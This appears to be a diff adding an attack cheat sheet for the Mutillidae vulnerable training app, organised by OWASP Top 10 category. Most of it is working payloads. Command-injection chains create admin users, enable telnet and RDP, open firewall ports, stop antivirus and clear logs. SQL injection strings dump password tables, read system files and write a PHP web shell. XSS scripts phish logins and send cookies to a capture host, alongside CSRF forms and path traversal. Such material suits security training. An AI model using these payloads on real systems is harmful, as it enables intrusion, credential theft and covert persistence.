+Recon: Chain commands to discover driectory structure
+
+	Windows XP: && cd ../../.. && dir
+	Linux: && cd ../../.. && ls -l
+
+Recon: Get a list of offerings provided by the "net.exe" program
+
+	Windows XP: && net
+
+Recon: Get a list of services that can be started or stopped
+
+	Windows XP: && net start
+	Windows XP: && net stop
+
+Scanning: Get machine network settings, hostname, DNS servers, subnet mask, etc.
+
+	Windows XP: && ipconfig /all
+	Linux: && ifconfig
+
+Scanning: Discover hosts on network
+
+	Windows XP: && ping -n 1 192.168.56.102
+	Linux: && ping -c 1 192.168.56.102
+
+Scanning: Enumerate Current user
+
+	Windows XP: && set
+	Linux: && whoami
+
+Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups
+
+	Windows XP: && net view [/domain]
+	Windows XP: && net user [/domain]
+	Windows XP: && net localgroup [/domain]
+
+Gaining Access: Add user
+
+	Windows XP: && net user <username> /add
+	Linux: useradd <username> 
+
+Gaining Access: Delete user
+
+	Windows XP: && net user <username> /delete 
+
+Maintain Access: Get Windows Service Names
+
+	Windows: sc query
+
+Maintain Access: kill AV
+
+	net stop <av process>
+	
+Maintain Access: kill firewall
+
+	Windows XP SP3: net stop netsvcs
+
+Maintain Access: Kill AV/protective services or open backdoor services
+	Windows XP: net stop <service name>
+	Windows XP: && net start telnet
+	Windows XP: && net stop telnet
+	
+Cover Tracks: Clear logs
+
+	Windows XP: && wevtutil cl
+
+Convering Tracks: Database Expolits via Command Injection
+
+	Linux (Samurai): 192.168.1.1; mysql �user=root �password=samurai �execute=�DROP TABLE accounts� owasp10
+
+Recon: Explore Database Files
+
+	Windows XP: && cd c:/xampp/mysql && dir
+
+------------------------------------------------------------------------------------------------------------
+Command Injection: Enable Windows Telnet Service (Windows XP SP3) 
+------------------------------------------------------------------------------------------------------------
+
+NOTE: Similar to Meterpreter run gettelnet <options>
+
+	List all services (sc query state= all)
+	
+		whatever && sc query state= all
+	
+	Check if service is running (sc query tlntsvr)
+	
+		whatever && sc query tlntsvr
+	
+	Configure telnet service to "demand" (sc config tlntsvr start= demand)
+	
+		whatever && sc config tlntsvr start= demand
+	
+	Start tlntsvr service (sc start tlntsvr)
+	
+		whatever && sc start tlntsvr
+	
+	Add user (net user <uname> <pw> /add)
+	
+		whatever && net user <uname> <pw> /add
+	
+	Add Telnet users group (net localgroup TelnetClients /add)
+	
+		whatever && net localgroup TelnetClients /add
+	
+	Add users to Administrators group (net localgroup Administrators <uname> /add)
+	
+		whatever && net localgroup Administrators <uname> /add
+	
+	Add Telnet user to group (net localgroup TelnetClients <uname> /add)
+	
+		whatever && net localgroup TelnetClients <uname> /add
+	
+	Allow firewall access (netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=<your IP>)
+	
+		whatever && netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=<your IP>
+
+	----------------------------
+	One combined injection:
+	----------------------------
+	
+		whatever && sc config tlntsvr start= demand && sc start tlntsvr && net user root toor /add && net localgroup TelnetClients /add && net localgroup Administrators root /add && net localgroup TelnetClients root /add && netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=192.168.56.101
+
+
+------------------------------------------------------------------------------------------------------------
+Command Injection: Enable Windows XP SP3 and similar Remote Desktop Terminal Service
+------------------------------------------------------------------------------------------------------------
+
+	Check if service running (sc query termservice)
+	Configure service from "disabled" to "manual"(sc config termservice start= demand)
+	Start service (sc start termservice)
+	Enable Terminal Services (reg add "hklm\system\currentcontrolset\control\terminalserver" /v fdenytsconnections /t reg_dword /d 0 /f)
+	Enable Terminal Services (reg add "hklm\system\currentcontrolset\control\terminalserver" /v TSEnabled /t reg_dword /d 1 /f)
+	Check if service listening (netstat -na | find "3389")
+	Add user (net user <uname> <pw> /add)
+	Add user to group (net localgroup "Remote Desktop Users" <uname> /add)
+	Configure firewall to allow RDP (netsh firewall set service type=remotedesktop mode=enable scope=custom addresses=<your IP>)
+
+-------------------------
+SQL Injection
+-------------------------
+
+Recon: Returns a string that indicates the MySQL server version
+
+	Page: user-info.php
+	Field: Username
+	Value: 	' union select null,VERSION() AS username,null,null --  
+			' union select null,null,null,version() --
+			 
+Recon: Returns a string that indicates the current database name
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,DATABASE() AS username,null,null --   
+
+Recon: Returns a string that indicates the current database username
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,USER() AS username,null,null --   
+
+Recon: Extract table names from database
+
+	Page: user-info.php
+	Field: Username
+	' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
+
+Recon: Extract table columns from database using a single field
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
+
+Recon: Extract views from database (Doesnt work in MySQL 5.1.8)
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
+
+Recon: Extract triggers from database
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Recon: Extract routines/procs from database
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,concat_ws('.', routine_schema, routine_name, '(', routine_type, ')') AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
+
+Recon: Extract metadata from database
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Recon/Scanning: Get specifications on database software
+
+	Page: user-info.php
+	Field: Username
+	Value: ' union select null, database(), current_user(), version() -- 
+
+Gaining Access: Extract passwords from user table
+
+	Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+
+Maintaining Access:
+
+Covering Tracks:
+
+	Page: login.php
+
+Gaining Access: Using SQL Injection
+
+' or 1=1 -- 
+
+Inserting new user using insert injection to bypass any protections. This example inserts a cross site script.
+
+	Page: Register.php
+	Field: Username
+
+	backdoor','password','<script>alert(\'Mallicious user input\')</script>') -- 
+
+	Note: Kind of pointless but still fun
+
+
+Using advanced techniques: Select Concat Char
+
+	Page: user-info.php
+	
+	This allows injection to select arbitrary text. This can be useful to bypass filters and WAFs.
+	' UNION ALL SELECT null,CONCAT(CHAR(112, 97, 115, 115, 119, 111, 114, 100)),null,null -- 
+
+Using advanced techniques: Select Using IFNULL to search for columns	
+
+	Page: user-info.php
+	' UNION ALL SELECT null,IFNULL(CAST(username AS CHAR),CHAR(32)),IFNULL(CAST(password AS CHAR),CHAR(32)),null FROM accounts -- 	
+
+Using advanced techniques: Open files on target operating system
+
+	Page: user-info.php
+	Field: username
+	Values:
+		' union select null, LOAD_FILE('../README') AS username, null, null-- 
+		' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null-- 
+		' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null-- 
+		' union select null, LOAD_FILE('mysql_error.log'), null, null-- 
+		' union select null, LOAD_FILE('..\\..\\..\\htdocs\\mutillidae\\index.php'), null, null--  
+
+Using advanced techniques: Writing files to operating system
+	Page: user-info.php
+	Field: username
+	Values:
+		' union select null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' -- 
+		
+<form action="" method="post" enctype="application/x-www-form-urlencoded">		
+	<table style="margin-left:auto; margin-right:auto;">
+		<tr>
+			<td colspan="2">Please enter system command</td>
+		</tr>
+		<tr><td></td></tr>
+		<tr>
+			<td class="label">Command</td>
+			<td><input type="text" name="pCommand" size="50"></td>
+		</tr>
+		<tr><td></td></tr>
+		<tr>
+			<td colspan="2" style="text-align:center;">
+				<input type="submit" value="Execute Command" />
+			</td>
+		</tr>
+	</table>
+</form>
+<?php
+	echo "<pre>";
+	echo shell_exec($_REQUEST["pCommand"]);
+	echo "</pre>";	
+?>
+
+<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>
+
+
+Using advanced techniques: Insert Injection
+
+	Technique: SQL Insert Injection 
+	Page: add-to-your-blog.php
+	Field: blog
+	Value: BARK','2003-12-31 01:02:03') --  
+
+--------------------------------------------------
+Blind SQL Injection
+--------------------------------------------------
+
+Recon: Blind SQL Injection/Brute Forcing values
+
+' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+
+' union select null, null, null, IF(((SELECT count(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_name = 'user') > 0), sleep(5), sleep(0)) -- 
+
+' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+
+' union Select null, sleep(5) -- 
+
+Page: login.php
+Technique: Blind SQL Injection - Timing
+Field: username
+Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
+
+Page: login.php
+Technique: Blind SQL Injection - True and False Values
+Field: username
+True Value (Using Proxy): ' or 1=1 -- 
+False Value (Using Proxy): ' and 1=0 --
+Examine responses to see if they are different 
+
+------------------------------------------------------------------------------------------
+Broken Authentication and Session Management - Escalating privileges
+------------------------------------------------------------------------------------------
+
+Gaining Access: Using insecure client-side authentication tokens
+
+Page: Any page
+Tool: Web Developer Toolbar
+
+Note what cookies the site has by default
+Create a test account
+Login using test account
+Check what cookies the site has after authentication
+Logout
+Verify auth cookies are gone or get rid of them
+Create a new cookie based on the original auth cookie, but with different value
+
+Gaining Access: Using insecure client-side authentication tokens
+
+Page: Any page
+Tool: Cookies Manager+ version 1.5.1 (verified with Firefox 4.0.1)
+
+Note what cookies the site has by default
+Create a test account
+Login using test account
+Check what cookies the site has after authentication
+Differential Analysis: Change the value of the original auth cookie
+Work backwards until admin account is found
+
+------------------------------------------------------------------------------------------
+Broken Authentication and Session Management - Bypass Authorization Control
+------------------------------------------------------------------------------------------
+
+Gaining Access: Using SQL injection
+
+Page: login.php
+Field: Username
+Value: ' or 1=1 -- 
+
+Gaining Access: Using SQL injection
+
+Page: login.php
+Field: Username
+Value: <target-username>' -- 
+
+------------------------------------------------------------
+Insecure Direct Object Reference - Accessing system files
+------------------------------------------------------------
+
+Step 1: Recon: Obtain list of files
+
+Possible Technique: Use command injection
+Page: dns-lookup.php
+Value (Windows): && dir /w
+Value (Linux): && pwd && ls -l
+
+Possible Techniques: Use robots.txt
+Possible Techniques: Use directory browsing
+Possible Techniques: Use directory brute-forcing
+
+Step 2: Gaining Access: Retrive system files
+
+Page: source-viewer.php
+Technique: Use proxy to change value, Use parent directory to bypass jails
+Tool: Tamper Data, Paros, WebScarab, Burp
+Field: phpfile
+Value: <system file path>, ../../../boot.ini, ..\..\..\WINDOW\System32\drivers\etc\hosts, ../../../etc/passwd
+
+-----------------------------
+Cross Site Scripting
+-----------------------------
+
+Page: add-to-your-blog.php
+Field: blog contents
+Value: <script>alert("Cookie stolen and sent to mallicious server: " + document.cookie + ". The developer should have encoded all output, validated all input, )</script>
+
+HTTP Header: Browser User Agent String
+Tool: User Agent Switcher
+Value: <h1>Sorry, please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><input type="submit" value="Submit"><h1>&nbsp;</h1>
+
+
+Defense: Encoding
+Defense When certain tokens allowed: Mapping
+
+Page: add-to-your-blog.php
+Field: blog contents	
+Tool: Burp-Suite
+Value: 
+	<div id="idLogin" style="padding:20px; position: absolute; top: 250px; left: 400px; background-color:#9999ff; border: solid black 1px; border-radius:15px;">
+		<script>
+		function capture(theForm){
+			var lXMLHTTP;
+			try{ 
+				var lData = "username=" + theForm.username.value + "&password=" + theForm.password.value;
+				var lHost = "localhost";
+				var lProtocol = "http";
+				var lAction = lProtocol + "://" + lHost + "/mutillidae/capture-data.php";
+				var lMethod = "post";
+				try{
+					lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); 
+				}catch (e){ 
+					try{ 
+						lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
+					}catch(e) { 
+						try{ 
+							lXMLHTTP = new XMLHttpRequest(); 
+						}catch (e) { 
+							alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+						};//end try
+					};//end try
+				};//end try
+				 
+				lXMLHTTP.onreadystatechange = function(){ 
+					if(lXMLHTTP.readyState == 4){ 
+						theForm.parentNode.style.display="none"; 
+					}// end if 
+				};
+		
+				lXMLHTTP.open(lMethod, lAction, true);
+				lXMLHTTP.setRequestHeader("Host", lHost); 
+				lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+				lXMLHTTP.send(lData);		
+			}catch(e){ 
+				alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+			};
+		};//end function
+		</script>
+		<form>
+			<table style="font-weight:bold;">
+				<tr><td colspan="2" style="font-size:20px;">Were sorry. This session has expired.<br/><br/>Please login again.</td></tr>
+				<tr><td colspan="2">&nbsp;</td></tr>
+				<tr><td>Username</td><td><input name="username" type="text"></td></tr>
+				<tr><td>Password</td><td><input name="password" type="text"></td></tr>
+				<tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:capture(this.form);" value="      Submit      "></td></tr>
+			</table>
+		</form>
+	</div>
+
+Defense: Encoding
+
+Page: add-to-your-blog
+Field: blog contents
+Value:
+
+<script>
+	var lXMLHTTP;
+	try{ 
+		var lData = "data=" + encodeURIComponent(document.cookie);
+		var lHost = "localhost";
+		var lProtocol = "http";
+		var lFilePath = "/mutillidae/capture-data.php";
+		var lAction = lProtocol + "://" + lHost + lFilePath;
+		var lMethod = "POST";
+
+		try {
+			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); 
+		}catch (e) { 
+			try { 
+				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new XMLHttpRequest(); 
+				}catch (e) { 
+					//alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+				} 
+			} 
+		}//end try
+
+		lXMLHTTP.onreadystatechange = function(){} 
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader("Host", lHost); 
+		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");			
+		lXMLHTTP.send(lData);
+
+	}catch(e){ 
+	} 
+</script>
+
+-----------------------------
+Cross Site Request Forgery
+-----------------------------
+
+Page: add-to-your-blog, view-someones-blog
+Tool: HTTPFox (to view forged request)
+
+Force someone to add a blog without consent:
+<form id="f" action="index.php?page=add-to-your-blog.php" method="post" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="csrf-token" value="best-guess"/>
+<input type="hidden" name="blog_entry" value="Add this guy to the Wall of Sheep"/>
+<input type="hidden" name="add-to-your-blog-php-submit-button" value="TESTING"/>
+</form>
+<i onmouseover="window.document.getElementById(\'f\').submit()">Dancing with the stars results</i>
+
+Force someone to log out:
+<i onmouseover="window.document.location=\'http://localhost/mutillidae/index.php?do=logout\'">How to improve your Facebook status</i>
+
+Force someone to add a blog without consent (Credit: Udit Bajaj):
+<script>
+	function autoadd() {
+		var curform = document.forms[0];
+		var elem = curform.elements["blog_entry"];
+		elem.value = "this is an auto message!";
+		var hiddenField = document.createElement("input");
+		hiddenField.setAttribute("type", "hidden");
+		hiddenField.setAttribute("name", �add-to-your-blog-php-submit-button�);
+		hiddenField.setAttribute("value", �Save Blog Entry�);
+		curform.appendChild(hiddenField);
+		curform.submit();
+	}
+</script>
+<b onmouseover= "autoadd()"> CECS 566 Test 2 solutions! </b>
+
+Force someone to register without their consent:
+<!--/* The following is an attempt at humor; albeit a very poor attempt. People often ask "What is the password for samurai?". The answer is below. Be careful to escape single-quotes if inserting into MySQL. This example has the single quotes MySQL escaped (' -> \'). The try/catch is just to help you debug. This is not intended to be used when pen testing because if the exploit fails the user is going to be notified. */--> <form id="CSRF" method="POST" action="/index.php?page=register.php"> <input name="username" value="sammy" type="hidden" /> <input name="password" value="samurai" type="hidden" /> <input name="confirm_password" value="samurai" type="hidden" /> <input name="my_signature" value="The password is samurai" type="hidden" /> <input name="register-php-submit-button" value="Create+Account" type="hidden" /> </form> <span onmouseover="try{var lURL=document.location.href;document.getElementById(\'CSRF\').submit();document.location.href=lURL;}catch(e){alert(e.message);}">Hello World</span>
+
+Force someone to register without their consent:
+Here is the same example using XHR rather than the "onmouseover" event:
+<script> var lXMLHTTP; try{ var lData = "username=fred&password=pass&confirm_password=pass&my_signature=signature1&register-php-submit-button=Create+Account"; var lAction = "/index.php?page=register.php"; var lMethod = "POST"; try { lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); }catch (e) { try { lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); }catch (e) { try { lXMLHTTP = new XMLHttpRequest(); }catch (e) { alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } }//end try lXMLHTTP.onreadystatechange = function(){ if(lXMLHTTP.readyState == 4){ alert("CSRF Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } ///////////////////////////// //UNCOMMENT FOR GET REQUESTS ///////////////////////////// //xmlhttp.open(lMethod, lAction, true); //lData=""; ///////////////////////////// ///////////////////////////// //UNCOMMENT FOR POST REQUESTS ///////////////////////////// lXMLHTTP.open(lMethod, lAction, true); lXMLHTTP.setRequestHeader("Method", "POST " + lAction + " HTTP/1.1"); lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); lXMLHTTP.send(lData); }catch(e){ alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } </script> 
+
+------------------------------------------------------------------------------------
+Sample to perform cross-site script on the Add to Your Blog that will 
+perform CSRF on the User Poll
+------------------------------------------------------------------------------------
+<script>
+function sendcsrf(){
+	var lForm = document.createElement("FORM");
+	lForm.action="http://mutillidae/index.php";
+	lForm.method = "GET";
+	lForm.enctype="application/x-www-form-urlencoded";
+	document.body.appendChild(lForm);
+
+	var lPage = document.createElement("INPUT");
+	lPage.setAttribute("name", "page");
+	lPage.setAttribute("type", "hidden");
+	lPage.setAttribute("value", "user-poll.php");
+	lForm.appendChild(lPage);
+
+	var lCSRFToken = document.createElement("INPUT");
+	lCSRFToken.setAttribute("name", "csrf-token");
+	lCSRFToken.setAttribute("type", "hidden");
+	lCSRFToken.setAttribute("value", "");
+	lForm.appendChild(lCSRFToken);
+
+	var lChoice = document.createElement("INPUT");
+	lChoice.setAttribute("name", "choice");
+	lChoice.setAttribute("type", "hidden");
+	lChoice.setAttribute("value", "nmap");
+	lForm.appendChild(lChoice);
+
+	var lInitials = document.createElement("INPUT");
+	lInitials.setAttribute("name", "initials");
+	lInitials.setAttribute("type", "hidden");
+	lInitials.setAttribute("value", "JD");
+	lForm.appendChild(lInitials);
+
+	var lButton = document.createElement("INPUT");
+	lButton.setAttribute("name", "user-poll-php-submit-button");
+	lButton.setAttribute("type", "hidden");
+	lButton.setAttribute("value", "Submit Vote");
+	lForm.appendChild(lButton);
+
+	lForm.submit();
+}
+</script>
+<span onmouseover="sendcsrf();">Vote for nmap. I know you will.</span>
+
+-------------------------
+Security Misconfiguration
+-------------------------
+
+Improper Error Handling: 
+
+Page: login.php
+Field: username
+Value: <single quote>
+Result: Error gives SQL exception
+
+---------------------------------
+Insecure Direct Object References
+---------------------------------
+
+Page: source-viewer.php
+Field: phpfile
+Value (Windows XP): c:\boot.ini, C:\WINDOWS\system32\drivers\etc\hosts
+Tool: netcat, tamper data, paros, webscarab, burp
+
+Use netcat or hackbar to send in post data: 
+	
+	phpfile=c:\boot.ini&source-file-viewer-php-submit-button="View File"
+	phpfile=C:\WINDOWS\system32\drivers\etc\hosts&source-file-viewer-php-submit-button="View File"
+
+Alternative: Use proxy to change value of phpfile to system file
+
+---------------------------------
+Insecure Cryptographic Storage
+---------------------------------
+
+Extract passwords from system:
+
+Page: user-info.php
+Technique: Direct SQL injection
+Field: username
+Value: ' or 1=1 -- 
+
+Page: user-info.php
+Technique: Indirect SQL injection
+Field: username
+Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+
+Page: login.php
+Technique: Blind SQL Injection
+Field: username
+Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
+
+
+---------------------------------
+Failure to Restrict URL Access
+---------------------------------
+
+Page: robots.txt
+Technique: Security Misconfiguration, Design Flaw
+
+Recon: List Files
+Technique: Shoulder surfing
+
+Recon: List Files
+Technique: Steal Bookmarks
+
+Recon: List Files
+Technique: Dump client cache
+
+Recon: List Files
+Page: dns-lookup.php
+Technique: Command Injection
+Field: hostname
+
+Scanning: View Source Code 
+Page: dns-lookup.php
+Technique: Command Injection
+Field: hostname
+Value: && type config.inc (then see source because PHP code doesnt show in browser)
+
+Gaining Access: View restricted page
+Page: Any (i.e. - http://localhost/mutillidae/config.inc, http://localhost/mutillidae/passwords/accounts.txt)
+Technique: Type in URL
+
+------------------------------------------
+Insufficient Transport Layer Protection
+------------------------------------------
+
+Gaining Access: Intercept clear text credentials
+Page: login.php
+Tool: Use any proxy (Paros, Tamper Data) or sniffer (Wireshark, TCPDump, Snort, etc.)
+Fields: Username and Password
+
+------------------------------------------
+Unvalidated redirects and forwards
+------------------------------------------
+
+Page: credits.php
+Technique: Phishing
+Tool: Any proxy, netcat, hackbar
+Field: forwardurl
+Value: any URI
+
+Page: credits.php
+Technique: Horizontal Application Attack, Restricted URL Access, Authroization Bypass
+Tool: Hackbar, anything that can change the URL query parameters
+Field: forwardurl
+Value: http://localhost/xampp
+
+--------------------------------------------
+Information Asset Protection - Cache Control
+--------------------------------------------
+
+Recon: Grab leaked company information
+Page: index.php, all
+Technique: View local cache
+Tool: Firefox about:cache, Internet Explorer Tools-->Options-->General Tab-->Browser History Settings-->View Files
+Defenses: cache control headers
+
+--------------------------------------------
+Information Asset Protection - Framing
+--------------------------------------------
+
+Gaining Access: Cross Frame Scripting/Click-jacking
+Page: index.php, all
+Tecnique: Frame page, use overlay
+Tool (to view defenses): HTTPFox
+Defense: x-frame-options, frame busters
+
+----------------------------------------------
+Information Asset Protection - Leaked Comments
+----------------------------------------------
+
+Page: index.php
+Technique: View Source
+Tool: View Source, Sniffer (Wireshark), HTTPFox
+Defense: Use framework comment tags to trap comments on the app server
+
+----------------------------------------------
+Log Injection
+----------------------------------------------
+
+Page: show-log.php
+Technique: Figure out what fields are logged, which of those the client controls, and inject those fields with SQL injection, HTML injection, XSS, XSRF, etc.
+Defense: Logs should be output encoded
+
+--------------------------------------------------------------------------------
+Generic XHR to steal cookies (prefix and suffix as necessary)
+--------------------------------------------------------------------------------
+
+<script>
+	var lXMLHTTP;
+	try{ 
+		var lData = <PUT-YOUR-DATA-HERE>;
+		var lHost = "<PUT-YOUR-HOST-HERE>";
+		var lAction = "http://" + lHost + "<PUT-YOUR-PATH-TO-PAGE-HERE>";
+		var lMethod = "<PUT-YOUR-METHOD-HERE: GET or POST>";
+		try { 
+			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); 
+		}catch (e) { 
+			try { 
+				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new XMLHttpRequest(); 
+				}catch (e) { 
+					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+				} 
+			} 
+		}//end try
+		 
+		lXMLHTTP.onreadystatechange = function(){ 
+			if(lXMLHTTP.readyState == 4){ 
+				alert("Capture Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+			}// end if 
+		} 
+		
+		lXMLHTTP.open(lMethod, lAction, true);
+		
+		///////////////////////////// 
+		//UNCOMMENT FOR GET REQUESTS 
+		///////////////////////////// 
+		//NOTE: This is a GET so your URL-action has to contain your data. We clear lData only to avoid error.
+		//lData="";
+		///////////////////////////// 
+		
+		///////////////////////////// 
+		//UNCOMMENT FOR POST REQUESTS 
+		///////////////////////////// 
+		//lXMLHTTP.setRequestHeader("Host", lHost); 
+		//lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+		///////////////////////////// 
+		
+		lXMLHTTP.send(lData);
+		
+	}catch(e){ 
+		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+	} 
+</script>
